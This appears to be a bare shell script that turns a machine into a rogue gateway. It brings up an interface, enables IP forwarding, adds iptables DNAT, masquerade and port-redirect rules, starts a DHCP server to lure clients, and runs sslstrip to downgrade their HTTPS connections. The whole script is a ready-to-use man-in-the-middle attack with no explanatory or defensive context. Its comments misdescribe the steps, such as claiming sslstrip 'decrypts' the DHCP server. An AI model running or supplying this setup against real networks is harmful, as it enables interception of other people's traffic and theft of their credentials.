source "./vars.txt"

# Configure dhcpd source and target paths
ifconfig $at_interface $routers netmask $netmask
ifconfig $at_interface mtu 1400

route add -net $subnet netmask $netmask gw $routers
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p udp -j DNAT --to $target
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface $at_interface -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port $port -j REDIRECT --to-port $redirect_port

dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid $at_interface

# Start dhcp server service
/etc/init.d/isc-dhcp-server start

# Start listening to and decrypt dhcp server with sslstrip
sslstrip -f -p -k $redirect_port
